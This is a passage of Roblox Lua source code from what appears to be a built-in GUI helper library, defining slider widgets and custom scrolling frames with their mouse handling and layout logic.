
		local slider = Instance.new("ImageButton")
		slider.Name = "Slider"
		slider.BackgroundTransparency = 1
		slider.Image = "rbxasset://textures/ui/Slider.png"
		slider.Position = UDim2.new(0,0,0.5,-10)
		slider.Size = UDim2.new(0,20,0,20)
		slider.ZIndex = 3
		slider.Parent = bar

		local areaSoakMouseMoveCon = nil

		areaSoak.MouseLeave:connect(function()
			if areaSoak.Visible then
				cancelSlide(areaSoak)
			end
		end)
		areaSoak.MouseButton1Up:connect(function()
			if areaSoak.Visible then
				cancelSlide(areaSoak)
			end
		end)

		slider.MouseButton1Down:connect(function()
			areaSoak.Visible = true
			if areaSoakMouseMoveCon then areaSoakMouseMoveCon:disconnect() end
			areaSoakMouseMoveCon = areaSoak.MouseMoved:connect(function(x,y)
				setSliderPos(x,slider,sliderPosition,bar,steps)
			end)
		end)

		slider.MouseButton1Up:connect(function() cancelSlide(areaSoak) end)

		sliderPosition.Changed:connect(function(prop)
			sliderPosition.Value = math.min(steps, math.max(1,sliderPosition.Value))
			local relativePosX = (sliderPosition.Value - 1) / (steps - 1)
			slider.Position = UDim2.new(relativePosX,-slider.AbsoluteSize.X/2,slider.Position.Y.Scale,slider.Position.Y.Offset)
		end)

		bar.MouseButton1Down:connect(function(x,y)
			setSliderPos(x,slider,sliderPosition,bar,steps)
		end)

		return sliderGui, sliderPosition, sliderSteps

	end



	t.CreateSliderNew = function(steps,width,position)
		local sliderGui = Instance.new("Frame")
		sliderGui.Size = UDim2.new(1,0,1,0)
		sliderGui.BackgroundTransparency = 1
		sliderGui.Name = "SliderGui"

		local sliderSteps = Instance.new("IntValue")
		sliderSteps.Name = "SliderSteps"
		sliderSteps.Value = steps
		sliderSteps.Parent = sliderGui

		local areaSoak = Instance.new("TextButton")
		areaSoak.Name = "AreaSoak"
		areaSoak.Text = ""
		areaSoak.BackgroundTransparency = 1
		areaSoak.Active = false
		areaSoak.Size = UDim2.new(1,0,1,0)
		areaSoak.Visible = false
		areaSoak.ZIndex = 6

		sliderGui.AncestryChanged:connect(function(child,parent)
			if parent == nil then
				areaSoak.Parent = nil
			else
				areaSoak.Parent = getLayerCollectorAncestor(sliderGui)
			end
		end)

		local sliderPosition = Instance.new("IntValue")
		sliderPosition.Name = "SliderPosition"
		sliderPosition.Value = 0
		sliderPosition.Parent = sliderGui

		local id = math.random(1,100)

		local sliderBarImgHeight = 7
		local sliderBarCapImgWidth = 4

		local bar = Instance.new("ImageButton")
		bar.BackgroundTransparency = 1
		bar.Image = "rbxasset://textures/ui/Slider-BKG-Center.png"
		bar.Name = "Bar"
		local displayWidth = 200
		if type(width) == "number" then
			bar.Size = UDim2.new(0,width - (sliderBarCapImgWidth * 2),0,sliderBarImgHeight)
			displayWidth = width - (sliderBarCapImgWidth * 2)
		else
			bar.Size = UDim2.new(0,200,0,sliderBarImgHeight)
		end
		bar.ZIndex = 3
		bar.Parent = sliderGui	
		if position["X"] and position["X"]["Scale"] and position["X"]["Offset"] and position["Y"] and position["Y"]["Scale"] and position["Y"]["Offset"] then
			bar.Position = position
		end

		local barLeft = bar:clone()
		barLeft.Name = "BarLeft"
		barLeft.Image = "rbxasset://textures/ui/Slider-BKG-Left-Cap.png"
		barLeft.Size = UDim2.new(0, sliderBarCapImgWidth, 0, sliderBarImgHeight)
		barLeft.Position = UDim2.new(position.X.Scale, position.X.Offset - sliderBarCapImgWidth, position.Y.Scale, position.Y.Offset)
		barLeft.Parent = sliderGui	
		barLeft.ZIndex = 3

		local barRight = barLeft:clone()
		barRight.Name = "BarRight"
		barRight.Image = "rbxasset://textures/ui/Slider-BKG-Right-Cap.png"
		barRight.Position = UDim2.new(position.X.Scale, position.X.Offset + displayWidth, position.Y.Scale, position.Y.Offset)
		barRight.Parent = sliderGui	

		local fillLeft = barLeft:clone()
		fillLeft.Name = "FillLeft"
		fillLeft.Image = "rbxasset://textures/ui/Slider-Fill-Left-Cap.png"
		fillLeft.Parent = sliderGui	
		fillLeft.ZIndex = 4

		local fill = fillLeft:clone()
		fill.Name = "Fill"
		fill.Image = "rbxasset://textures/ui/Slider-Fill-Center.png"
		fill.Parent = bar	
		fill.ZIndex = 4
		fill.Position = UDim2.new(0, 0, 0, 0)
		fill.Size = UDim2.new(0.5, 0, 1, 0)


		--	bar.Visible = false

		local slider = Instance.new("ImageButton")
		slider.Name = "Slider"
		slider.BackgroundTransparency = 1
		slider.Image = "rbxasset://textures/ui/slider_new_tab.png"
		slider.Position = UDim2.new(0,0,0.5,-14)
		slider.Size = UDim2.new(0,28,0,28)
		slider.ZIndex = 5
		slider.Parent = bar

		local areaSoakMouseMoveCon = nil

		areaSoak.MouseLeave:connect(function()
			if areaSoak.Visible then
				cancelSlide(areaSoak)
			end
		end)
		areaSoak.MouseButton1Up:connect(function()
			if areaSoak.Visible then
				cancelSlide(areaSoak)
			end
		end)

		slider.MouseButton1Down:connect(function()
			areaSoak.Visible = true
			if areaSoakMouseMoveCon then areaSoakMouseMoveCon:disconnect() end
			areaSoakMouseMoveCon = areaSoak.MouseMoved:connect(function(x,y)
				setSliderPos(x,slider,sliderPosition,bar,steps)
			end)
		end)

		slider.MouseButton1Up:connect(function() cancelSlide(areaSoak) end)

		sliderPosition.Changed:connect(function(prop)
			sliderPosition.Value = math.min(steps, math.max(1,sliderPosition.Value))
			local relativePosX = (sliderPosition.Value - 1) / (steps - 1)
			slider.Position = UDim2.new(relativePosX,-slider.AbsoluteSize.X/2,slider.Position.Y.Scale,slider.Position.Y.Offset)
			fill.Size = UDim2.new(relativePosX, 0, 1, 0)
		end)

		bar.MouseButton1Down:connect(function(x,y)
			setSliderPos(x,slider,sliderPosition,bar,steps)
		end)

		fill.MouseButton1Down:connect(function(x,y)
			setSliderPos(x,slider,sliderPosition,bar,steps)
		end)

		fillLeft.MouseButton1Down:connect(function(x,y)
			setSliderPos(x,slider,sliderPosition,bar,steps)
		end)


		return sliderGui, sliderPosition, sliderSteps

	end





	t.CreateTrueScrollingFrame = function()
		local lowY = nil
		local highY = nil

		local dragCon = nil
		local upCon = nil

		local internalChange = false

		local descendantsChangeConMap = {}

		local scrollingFrame = Instance.new("Frame")
		scrollingFrame.Name = "ScrollingFrame"
		scrollingFrame.Active = true
		scrollingFrame.Size = UDim2.new(1,0,1,0)
		scrollingFrame.ClipsDescendants = true

		local controlFrame = Instance.new("Frame")
		controlFrame.Name = "ControlFrame"
		controlFrame.BackgroundTransparency = 1
		controlFrame.Size = UDim2.new(0,18,1,0)
		controlFrame.Position = UDim2.new(1,-20,0,0)
		controlFrame.Parent = scrollingFrame

		local scrollBottom = Instance.new("BoolValue")
		scrollBottom.Value = false
		scrollBottom.Name = "ScrollBottom"
		scrollBottom.Parent = controlFrame

		local scrollUp = Instance.new("BoolValue")
		scrollUp.Value = false
		scrollUp.Name = "scrollUp"
		scrollUp.Parent = controlFrame

		local scrollUpButton = Instance.new("TextButton")
		scrollUpButton.Name = "ScrollUpButton"
		scrollUpButton.Text = ""
		scrollUpButton.AutoButtonColor = false
		scrollUpButton.BackgroundColor3 = Color3.new(0,0,0)
		scrollUpButton.BorderColor3 = Color3.new(1,1,1)
		scrollUpButton.BackgroundTransparency = 0.5
		scrollUpButton.Size = UDim2.new(0,18,0,18)
		scrollUpButton.ZIndex = 2
		scrollUpButton.Parent = controlFrame
		for i = 1, 6 do
			local triFrame = Instance.new("Frame")
			triFrame.BorderColor3 = Color3.new(1,1,1)
			triFrame.Name = "tri" .. tostring(i)
			triFrame.ZIndex = 3
			triFrame.BackgroundTransparency = 0.5
			triFrame.Size = UDim2.new(0,12 - ((i -1) * 2),0,0)
			triFrame.Position = UDim2.new(0,3 + (i -1),0.5,2 - (i -1))
			triFrame.Parent = scrollUpButton
		end
		scrollUpButton.MouseEnter:connect(function()
			scrollUpButton.BackgroundTransparency = 0.1
			local upChildren = scrollUpButton:GetChildren()
			for i = 1, #upChildren do
				upChildren[i].BackgroundTransparency = 0.1
			end
		end)
		scrollUpButton.MouseLeave:connect(function()
			scrollUpButton.BackgroundTransparency = 0.5
			local upChildren = scrollUpButton:GetChildren()
			for i = 1, #upChildren do
				upChildren[i].BackgroundTransparency = 0.5
			end
		end)

		local scrollDownButton = scrollUpButton:clone()
		scrollDownButton.Name = "ScrollDownButton"
		scrollDownButton.Position = UDim2.new(0,0,1,-18)
		local downChildren = scrollDownButton:GetChildren()
		for i = 1, #downChildren do
			downChildren[i].Position = UDim2.new(0,3 + (i -1),0.5,-2 + (i - 1))
		end
		scrollDownButton.MouseEnter:connect(function()
			scrollDownButton.BackgroundTransparency = 0.1
			local downChildren = scrollDownButton:GetChildren()
			for i = 1, #downChildren do
				downChildren[i].BackgroundTransparency = 0.1
			end
		end)
		scrollDownButton.MouseLeave:connect(function()
			scrollDownButton.BackgroundTransparency = 0.5
			local downChildren = scrollDownButton:GetChildren()
			for i = 1, #downChildren do
				downChildren[i].BackgroundTransparency = 0.5
			end
		end)
		scrollDownButton.Parent = controlFrame

		local scrollTrack = Instance.new("Frame")
		scrollTrack.Name = "ScrollTrack"
		scrollTrack.BackgroundTransparency = 1
		scrollTrack.Size = UDim2.new(0,18,1,-38)
		scrollTrack.Position = UDim2.new(0,0,0,19)
		scrollTrack.Parent = controlFrame

		local scrollbar = Instance.new("TextButton")
		scrollbar.BackgroundColor3 = Color3.new(0,0,0)
		scrollbar.BorderColor3 = Color3.new(1,1,1)
		scrollbar.BackgroundTransparency = 0.5
		scrollbar.AutoButtonColor = false
		scrollbar.Text = ""
		scrollbar.Active = true
		scrollbar.Name = "ScrollBar"
		scrollbar.ZIndex = 2
		scrollbar.BackgroundTransparency = 0.5
		scrollbar.Size = UDim2.new(0, 18, 0.1, 0)
		scrollbar.Position = UDim2.new(0,0,0,0)
		scrollbar.Parent = scrollTrack

		local scrollNub = Instance.new("Frame")
		scrollNub.Name = "ScrollNub"
		scrollNub.BorderColor3 = Color3.new(1,1,1)
		scrollNub.Size = UDim2.new(0,10,0,0)
		scrollNub.Position = UDim2.new(0.5,-5,0.5,0)
		scrollNub.ZIndex = 2
		scrollNub.BackgroundTransparency = 0.5
		scrollNub.Parent = scrollbar

		local newNub = scrollNub:clone()
		newNub.Position = UDim2.new(0.5,-5,0.5,-2)
		newNub.Parent = scrollbar

		local lastNub = scrollNub:clone()
		lastNub.Position = UDim2.new(0.5,-5,0.5,2)
		lastNub.Parent = scrollbar

		scrollbar.MouseEnter:connect(function()
			scrollbar.BackgroundTransparency = 0.1
			scrollNub.BackgroundTransparency = 0.1
			newNub.BackgroundTransparency = 0.1
			lastNub.BackgroundTransparency = 0.1
		end)
		scrollbar.MouseLeave:connect(function()
			scrollbar.BackgroundTransparency = 0.5
			scrollNub.BackgroundTransparency = 0.5
			newNub.BackgroundTransparency = 0.5
			lastNub.BackgroundTransparency = 0.5
		end)

		local mouseDrag = Instance.new("ImageButton")
		mouseDrag.Active = false
		mouseDrag.Size = UDim2.new(1.5, 0, 1.5, 0)
		mouseDrag.AutoButtonColor = false
		mouseDrag.BackgroundTransparency = 1
		mouseDrag.Name = "mouseDrag"
		mouseDrag.Position = UDim2.new(-0.25, 0, -0.25, 0)
		mouseDrag.ZIndex = 10

		local function positionScrollBar(x,y,offset)
			local oldPos = scrollbar.Position

			if y < scrollTrack.AbsolutePosition.y then
				scrollbar.Position = UDim2.new(scrollbar.Position.X.Scale,scrollbar.Position.X.Offset,0,0)
				return (oldPos ~= scrollbar.Position)
			end

			local relativeSize = scrollbar.AbsoluteSize.Y/scrollTrack.AbsoluteSize.Y

			if y > (scrollTrack.AbsolutePosition.y + scrollTrack.AbsoluteSize.y) then
				scrollbar.Position = UDim2.new(scrollbar.Position.X.Scale,scrollbar.Position.X.Offset,1 - relativeSize,0)
				return (oldPos ~= scrollbar.Position)
			end
			local newScaleYPos = (y - scrollTrack.AbsolutePosition.y - offset)/scrollTrack.AbsoluteSize.y
			if newScaleYPos + relativeSize > 1 then
				newScaleYPos = 1 - relativeSize
				scrollBottom.Value = true
				scrollUp.Value = false
			elseif newScaleYPos <= 0 then
				newScaleYPos = 0
				scrollUp.Value = true
				scrollBottom.Value = false
			else
				scrollUp.Value = false
				scrollBottom.Value = false
			end
			scrollbar.Position = UDim2.new(scrollbar.Position.X.Scale,scrollbar.Position.X.Offset,newScaleYPos,0)

			return (oldPos ~= scrollbar.Position)
		end

		local function drillDownSetHighLow(instance)
			if not instance or not instance:IsA("GuiObject") then return end
			if instance == controlFrame then return end
			if instance:IsDescendantOf(controlFrame) then return end
			if not instance.Visible then return end

			if lowY and lowY > instance.AbsolutePosition.Y then
				lowY = instance.AbsolutePosition.Y
			elseif not lowY then
				lowY = instance.AbsolutePosition.Y
			end
			if highY and highY < (instance.AbsolutePosition.Y + instance.AbsoluteSize.Y) then
				highY = instance.AbsolutePosition.Y + instance.AbsoluteSize.Y
			elseif not highY then
				highY = instance.AbsolutePosition.Y + instance.AbsoluteSize.Y
			end
			local children = instance:GetChildren()
			for i = 1, #children do
				drillDownSetHighLow(children[i])
			end
		end

		local function resetHighLow()
			local firstChildren = scrollingFrame:GetChildren()

			for i = 1, #firstChildren do
				drillDownSetHighLow(firstChildren[i])
			end
		end

		local function recalculate()
			internalChange = true

			local percentFrame = 0
			if scrollbar.Position.Y.Scale > 0 then
				if scrollbar.Visible then
					percentFrame = scrollbar.Position.Y.Scale/((scrollTrack.AbsoluteSize.Y - scrollbar.AbsoluteSize.Y)/scrollTrack.AbsoluteSize.Y)
				else
					percentFrame = 0
				end
			end
			if percentFrame > 0.99 then percentFrame = 1 end

			local hiddenYAmount = (scrollingFrame.AbsoluteSize.Y - (highY - lowY)) * percentFrame

			local guiChildren = scrollingFrame:GetChildren()
			for i = 1, #guiChildren do
				if guiChildren[i] ~= controlFrame then
					guiChildren[i].Position = UDim2.new(guiChildren[i].Position.X.Scale,guiChildren[i].Position.X.Offset,
						0, math.ceil(guiChildren[i].AbsolutePosition.Y) - math.ceil(lowY) + hiddenYAmount)
				end
			end

			lowY = nil
			highY = nil
			resetHighLow()
			internalChange = false
		end

		local function setSliderSizeAndPosition()
			if not highY or not lowY then return end

			local totalYSpan = math.abs(highY - lowY)
			if totalYSpan == 0 then
				scrollbar.Visible = false
				scrollDownButton.Visible = false
				scrollUpButton.Visible = false

				if dragCon then dragCon:disconnect() dragCon = nil end
				if upCon then upCon:disconnect() upCon = nil end
				return
			end

			local percentShown = scrollingFrame.AbsoluteSize.Y/totalYSpan
			if percentShown >= 1 then
				scrollbar.Visible = false
				scrollDownButton.Visible = false
				scrollUpButton.Visible = false
				recalculate()
			else
				scrollbar.Visible = true
				scrollDownButton.Visible = true
				scrollUpButton.Visible = true

				scrollbar.Size = UDim2.new(scrollbar.Size.X.Scale,scrollbar.Size.X.Offset,percentShown,0)
			end

			local percentPosition = (scrollingFrame.AbsolutePosition.Y - lowY)/totalYSpan
			scrollbar.Position = UDim2.new(scrollbar.Position.X.Scale,scrollbar.Position.X.Offset,percentPosition,-scrollbar.AbsoluteSize.X/2)

			if scrollbar.AbsolutePosition.y < scrollTrack.AbsolutePosition.y then
				scrollbar.Position = UDim2.new(scrollbar.Position.X.Scale,scrollbar.Position.X.Offset,0,0)
			end

			if (scrollbar.AbsolutePosition.y + scrollbar.AbsoluteSize.Y) > (scrollTrack.AbsolutePosition.y + scrollTrack.AbsoluteSize.y) then
				local relativeSize = scrollbar.AbsoluteSize.Y/scrollTrack.AbsoluteSize.Y
				scrollbar.Position = UDim2.new(scrollbar.Position.X.Scale,scrollbar.Position.X.Offset,1 - relativeSize,0)
			end
		end

		local buttonScrollAmountPixels = 7
		local reentrancyGuardScrollUp = false
		local function doScrollUp()
			if reentrancyGuardScrollUp then return end

			reentrancyGuardScrollUp = true
			if positionScrollBar(0,scrollbar.AbsolutePosition.Y - buttonScrollAmountPixels,0) then
				recalculate()
			end
			reentrancyGuardScrollUp = false
		end

		local reentrancyGuardScrollDown = false
		local function doScrollDown()
			if reentrancyGuardScrollDown then return end

			reentrancyGuardScrollDown = true
			if positionScrollBar(0,scrollbar.AbsolutePosition.Y + buttonScrollAmountPixels,0) then
				recalculate()
			end
			reentrancyGuardScrollDown = false
		end

		local function scrollUp(mouseYPos)
			if scrollUpButton.Active then
				scrollStamp = tick()
				local current = scrollStamp
				local upCon
				upCon = mouseDrag.MouseButton1Up:connect(function()
					scrollStamp = tick()
					mouseDrag.Parent = nil
					upCon:disconnect()
				end)
				mouseDrag.Parent = getLayerCollectorAncestor(scrollbar)
				doScrollUp()
				wait(0.2)
				local t = tick()
				local w = 0.1
				while scrollStamp == current do
					doScrollUp()
					if mouseYPos and mouseYPos > scrollbar.AbsolutePosition.y then
						break
					end
					if not scrollUpButton.Active then break end
					if tick()-t > 5 then
						w = 0
					elseif tick()-t > 2 then
						w = 0.06
					end
					wait(w)
				end
			end
		end

		local function scrollDown(mouseYPos)
			if scrollDownButton.Active then
				scrollStamp = tick()
				local current = scrollStamp
				local downCon
				downCon = mouseDrag.MouseButton1Up:connect(function()
					scrollStamp = tick()
					mouseDrag.Parent = nil
					downCon:disconnect()
				end)
				mouseDrag.Parent = getLayerCollectorAncestor(scrollbar)
				doScrollDown()
				wait(0.2)
				local t = tick()
				local w = 0.1
				while scrollStamp == current do
					doScrollDown()
					if mouseYPos and mouseYPos < (scrollbar.AbsolutePosition.y + scrollbar.AbsoluteSize.x) then
						break
					end
					if not scrollDownButton.Active then break end
					if tick()-t > 5 then
						w = 0
					elseif tick()-t > 2 then
						w = 0.06
					end
					wait(w)
				end
			end
		end

		scrollbar.MouseButton1Down:connect(function(x,y)
			if scrollbar.Active then
				scrollStamp = tick()
				local mouseOffset = y - scrollbar.AbsolutePosition.y
				if dragCon then dragCon:disconnect() dragCon = nil end
				if upCon then upCon:disconnect() upCon = nil end
				local prevY = y
				local reentrancyGuardMouseScroll = false
				dragCon = mouseDrag.MouseMoved:connect(function(x,y)
					if reentrancyGuardMouseScroll then return end

					reentrancyGuardMouseScroll = true
					if positionScrollBar(x,y,mouseOffset) then
						recalculate()
					end
					reentrancyGuardMouseScroll = false

				end)
				upCon = mouseDrag.MouseButton1Up:connect(function()
					scrollStamp = tick()
					mouseDrag.Parent = nil
					dragCon:disconnect(); dragCon = nil
					upCon:disconnect(); drag = nil
				end)
				mouseDrag.Parent = getLayerCollectorAncestor(scrollbar)
			end
		end)

		local scrollMouseCount = 0

		scrollUpButton.MouseButton1Down:connect(function()
			scrollUp()
		end)
		scrollUpButton.MouseButton1Up:connect(function()
			scrollStamp = tick()
		end)

		scrollDownButton.MouseButton1Up:connect(function()
			scrollStamp = tick()
		end)
		scrollDownButton.MouseButton1Down:connect(function()
			scrollDown()
		end)

		scrollbar.MouseButton1Up:connect(function()
			scrollStamp = tick()
		end)

		local function heightCheck(instance)
			if highY and (instance.AbsolutePosition.Y + instance.AbsoluteSize.Y) > highY then
				highY = instance.AbsolutePosition.Y + instance.AbsoluteSize.Y
			elseif not highY then
				highY = instance.AbsolutePosition.Y + instance.AbsoluteSize.Y
			end
			setSliderSizeAndPosition()
		end

		local function highLowRecheck()
			local oldLowY = lowY
			local oldHighY = highY
			lowY = nil
			highY = nil
			resetHighLow()

			if (lowY ~= oldLowY) or (highY ~= oldHighY) then
				setSliderSizeAndPosition()
			end
		end

		local function descendantChanged(this, prop)
			if internalChange then return end
			if not this.Visible then return end

			if prop == "Size" or prop == "Position" then
				wait()
				highLowRecheck()
			end
		end

		scrollingFrame.DescendantAdded:connect(function(instance)
			if not instance:IsA("GuiObject") then return end

			if instance.Visible then
				wait() -- wait a heartbeat for sizes to reconfig
				highLowRecheck()
			end

			descendantsChangeConMap[instance] = instance.Changed:connect(function(prop) descendantChanged(instance, prop) end)
		end)

		scrollingFrame.DescendantRemoving:connect(function(instance)
			if not instance:IsA("GuiObject") then return end
			if descendantsChangeConMap[instance] then
				descendantsChangeConMap[instance]:disconnect()
				descendantsChangeConMap[instance] = nil
			end
			wait() -- wait a heartbeat for sizes to reconfig
			highLowRecheck()
		end)

		scrollingFrame.Changed:connect(function(prop)
			if prop == "AbsoluteSize" then
				if not highY or not lowY then return end

				highLowRecheck()
				setSliderSizeAndPosition()
			end
		end)

		return scrollingFrame, controlFrame
	end

	t.CreateScrollingFrame = function(orderList,scrollStyle)
		local frame = Instance.new("Frame")
		frame.Name = "ScrollingFrame"
		frame.BackgroundTransparency = 1
		frame.Size = UDim2.new(1,0,1,0)

		local scrollUpButton = Instance.new("ImageButton")
		scrollUpButton.Name = "ScrollUpButton"
		scrollUpButton.BackgroundTransparency = 1
		scrollUpButton.Image = "rbxasset://textures/ui/scrollbuttonUp.png"
		scrollUpButton.Size = UDim2.new(0,17,0,17) 


		local scrollDownButton = Instance.new("ImageButton")
		scrollDownButton.Name = "ScrollDownButton"
		scrollDownButton.BackgroundTransparency = 1
		scrollDownButton.Image = "rbxasset://textures/ui/scrollbuttonDown.png"
		scrollDownButton.Size = UDim2.new(0,17,0,17) 

		local scrollbar = Instance.new("ImageButton")
		scrollbar.Name = "ScrollBar"
		scrollbar.Image = "rbxasset://textures/ui/scrollbar.png"
		scrollbar.BackgroundTransparency = 1
		scrollbar.Size = UDim2.new(0, 18, 0, 150)

		local scrollStamp = 0

		local scrollDrag = Instance.new("ImageButton")
		scrollDrag.Image = "https://www.roblox.com/asset/?id=61367186"
		scrollDrag.Size = UDim2.new(1, 0, 0, 16)
		scrollDrag.BackgroundTransparency = 1
		scrollDrag.Name = "ScrollDrag"
		scrollDrag.Active = true
		scrollDrag.Parent = scrollbar

		local mouseDrag = Instance.new("ImageButton")
		mouseDrag.Active = false
		mouseDrag.Size = UDim2.new(1.5, 0, 1.5, 0)
		mouseDrag.AutoButtonColor = false
		mouseDrag.BackgroundTransparency = 1
		mouseDrag.Name = "mouseDrag"
		mouseDrag.Position = UDim2.new(-0.25, 0, -0.25, 0)
		mouseDrag.ZIndex = 10

		local style = "simple"
		if scrollStyle and tostring(scrollStyle) then
			style = scrollStyle
		end

		local scrollPosition = 1
		local rowSize = 0
		local howManyDisplayed = 0

		local layoutGridScrollBar = function()
			howManyDisplayed = 0
			local guiObjects = {}
			if orderList then
				for i, child in ipairs(orderList) do
					if child.Parent == frame then
						table.insert(guiObjects, child)
					end
				end
			else
				local children = frame:GetChildren()
				if children then
					for i, child in ipairs(children) do 
						if child:IsA("GuiObject") then
							table.insert(guiObjects, child)
						end
					end
				end
			end
			if #guiObjects == 0 then
				scrollUpButton.Active = false
				scrollDownButton.Active = false
				scrollDrag.Active = false
				scrollPosition = 1
				return
			end

			if scrollPosition > #guiObjects then
				scrollPosition = #guiObjects
			end

			if scrollPosition < 1 then scrollPosition = 1 end

			local totalPixelsY = frame.AbsoluteSize.Y
			local pixelsRemainingY = frame.AbsoluteSize.Y

			local totalPixelsX  = frame.AbsoluteSize.X

			local xCounter = 0
			local rowSizeCounter = 0
			local setRowSize = true

			local pixelsBelowScrollbar = 0
			local pos = #guiObjects

			local currentRowY = 0

			pos = scrollPosition
			--count up from current scroll position to fill out grid
			while pos <= #guiObjects and pixelsBelowScrollbar < totalPixelsY do
				xCounter = xCounter + guiObjects[pos].AbsoluteSize.X
				--previous pos was the end of a row
				if xCounter >= totalPixelsX then
					pixelsBelowScrollbar = pixelsBelowScrollbar + currentRowY
					currentRowY = 0
					xCounter = guiObjects[pos].AbsoluteSize.X
				end
				if guiObjects[pos].AbsoluteSize.Y > currentRowY then
					currentRowY = guiObjects[pos].AbsoluteSize.Y
				end
				pos = pos + 1
			end
			--Count wherever current row left off
			pixelsBelowScrollbar = pixelsBelowScrollbar + currentRowY
			currentRowY = 0

			pos = scrollPosition - 1
			xCounter = 0

			--objects with varying X,Y dimensions can rarely cause minor errors
			--rechecking every new scrollPosition is necessary to avoid 100% of errors

			--count backwards from current scrollPosition to see if we can add more rows
			while pixelsBelowScrollbar + currentRowY < totalPixelsY and pos >= 1 do
				xCounter = xCounter + guiObjects[pos].AbsoluteSize.X
				rowSizeCounter = rowSizeCounter + 1
				if xCounter >= totalPixelsX then
					rowSize = rowSizeCounter - 1
					rowSizeCounter = 0
					xCounter = guiObjects[pos].AbsoluteSize.X
					if pixelsBelowScrollbar + currentRowY <= totalPixelsY then
						--It fits, so back up our scroll position
						pixelsBelowScrollbar = pixelsBelowScrollbar + currentRowY
						if scrollPosition <= rowSize then
							scrollPosition = 1 
							break
						else
							scrollPosition = scrollPosition - rowSize
						end
						currentRowY = 0
					else
						break
					end
				end

				if guiObjects[pos].AbsoluteSize.Y > currentRowY then
					currentRowY = guiObjects[pos].AbsoluteSize.Y
				end

				pos = pos - 1
			end

			--Do check last time if pos = 0
			if (pos == 0) and (pixelsBelowScrollbar + currentRowY <= totalPixelsY) then
				scrollPosition = 1
			end

			xCounter = 0
			--pos = scrollPosition
			rowSizeCounter = 0
			setRowSize = true
			local lastChildSize = 0

			local xOffset,yOffset = 0
			if guiObjects[1] then
				yOffset = math.ceil(math.floor(math.fmod(totalPixelsY,guiObjects[1].AbsoluteSize.X))/2)
				xOffset = math.ceil(math.floor(math.fmod(totalPixelsX,guiObjects[1].AbsoluteSize.Y))/2)
			end

			for i, child in ipairs(guiObjects) do
				if i < scrollPosition then
					--print("Hiding " .. child.Name)
					child.Visible = false
				else
					if pixelsRemainingY < 0 then
						--print("Out of Space " .. child.Name)
						child.Visible = false
					else
						--print("Laying out " .. child.Name)
						--GuiObject
						if setRowSize then rowSizeCounter = rowSizeCounter + 1 end
						if xCounter + child.AbsoluteSize.X >= totalPixelsX then
							if setRowSize then
								rowSize = rowSizeCounter - 1
								setRowSize = false
							end
							xCounter = 0
							pixelsRemainingY = pixelsRemainingY - child.AbsoluteSize.Y
						end
						child.Position = UDim2.new(child.Position.X.Scale,xCounter + xOffset, 0, totalPixelsY - pixelsRemainingY + yOffset)
						xCounter = xCounter + child.AbsoluteSize.X
						child.Visible = ((pixelsRemainingY - child.AbsoluteSize.Y) >= 0)
						if child.Visible then
							howManyDisplayed = howManyDisplayed + 1
						end
						lastChildSize = child.AbsoluteSize				
					end
				end
			end

			scrollUpButton.Active = (scrollPosition > 1)
			if lastChildSize == 0 then 
				scrollDownButton.Active = false
			else
				scrollDownButton.Active = ((pixelsRemainingY - lastChildSize.Y) < 0)
			end
			scrollDrag.Active = #guiObjects > howManyDisplayed
			scrollDrag.Visible = scrollDrag.Active
		end



		local layoutSimpleScrollBar = function()
			local guiObjects = {}	
			howManyDisplayed = 0

			if orderList then
				for i, child in ipairs(orderList) do
					if child.Parent == frame then
						table.insert(guiObjects, child)
					end
				end
			else
				local children = frame:GetChildren()
				if children then
					for i, child in ipairs(children) do 
						if child:IsA("GuiObject") then
							table.insert(guiObjects, child)
						end
					end
				end
			end
			if #guiObjects == 0 then
				scrollUpButton.Active = false
				scrollDownButton.Active = false
				scrollDrag.Active = false
				scrollPosition = 1
				return
			end

			if scrollPosition > #guiObjects then
				scrollPosition = #guiObjects
			end

			local totalPixels = frame.AbsoluteSize.Y
			local pixelsRemaining = frame.AbsoluteSize.Y

			local pixelsBelowScrollbar = 0
			local pos = #guiObjects
			while pixelsBelowScrollbar < totalPixels and pos >= 1 do
				if pos >= scrollPosition then
					pixelsBelowScrollbar = pixelsBelowScrollbar + guiObjects[pos].AbsoluteSize.Y
				else
					if pixelsBelowScrollbar + guiObjects[pos].AbsoluteSize.Y <= totalPixels then
						--It fits, so back up our scroll position
						pixelsBelowScrollbar = pixelsBelowScrollbar + guiObjects[pos].AbsoluteSize.Y
						if scrollPosition <= 1 then
							scrollPosition = 1
							break
						else
							--local ("Backing up ScrollPosition from -- " ..scrollPosition)
							scrollPosition = scrollPosition - 1
						end
					else
						break
					end
				end
				pos = pos - 1
			end

			pos = scrollPosition
			for i, child in ipairs(guiObjects) do
				if i < scrollPosition then
					--print("Hiding " .. child.Name)
					child.Visible = false
				else
					if pixelsRemaining < 0 then
						--print("Out of Space " .. child.Name)
						child.Visible = false
					else
						--print("Laying out " .. child.Name)
						--GuiObject
						child.Position = UDim2.new(child.Position.X.Scale, child.Position.X.Offset, 0, totalPixels - pixelsRemaining)
						pixelsRemaining = pixelsRemaining - child.AbsoluteSize.Y
						if  (pixelsRemaining >= 0) then
							child.Visible = true
							howManyDisplayed = howManyDisplayed + 1
						else
							child.Visible = false
						end		
					end
				end
			end
			scrollUpButton.Active = (scrollPosition > 1)
			scrollDownButton.Active = (pixelsRemaining < 0)
			scrollDrag.Active = #guiObjects > howManyDisplayed
			scrollDrag.Visible = scrollDrag.Active
		end


		local moveDragger = function()	
			local guiObjects = 0
			local children = frame:GetChildren()
			if children then
				for i, child in ipairs(children) do 
					if child:IsA("GuiObject") then
						guiObjects = guiObjects + 1
					end
				end
			end

			if not scrollDrag.Parent then return end

			local dragSizeY = scrollDrag.Parent.AbsoluteSize.y * (1/(guiObjects - howManyDisplayed + 1))
			if dragSizeY < 16 then dragSizeY = 16 end
			scrollDrag.Size = UDim2.new(scrollDrag.Size.X.Scale,scrollDrag.Size.X.Offset,scrollDrag.Size.Y.Scale,dragSizeY)

			local relativeYPos = (scrollPosition - 1)/(guiObjects - (howManyDisplayed))
			if relativeYPos > 1 then relativeYPos = 1
			elseif relativeYPos < 0 then relativeYPos = 0 end
			local absYPos = 0

			if relativeYPos ~= 0 then
				absYPos = (relativeYPos * scrollbar.AbsoluteSize.y) - (relativeYPos * scrollDrag.AbsoluteSize.y)
			end

			scrollDrag.Position = UDim2.new(scrollDrag.Position.X.Scale,scrollDrag.Position.X.Offset,scrollDrag.Position.Y.Scale,absYPos)
		end

		local reentrancyGuard = false
		local recalculate = function()
			if reentrancyGuard then
				return
			end
			reentrancyGuard = true
			wait()
			local success, err = nil
			if style == "grid" then
				success, err = pcall(function() layoutGridScrollBar() end)
			elseif style == "simple" then
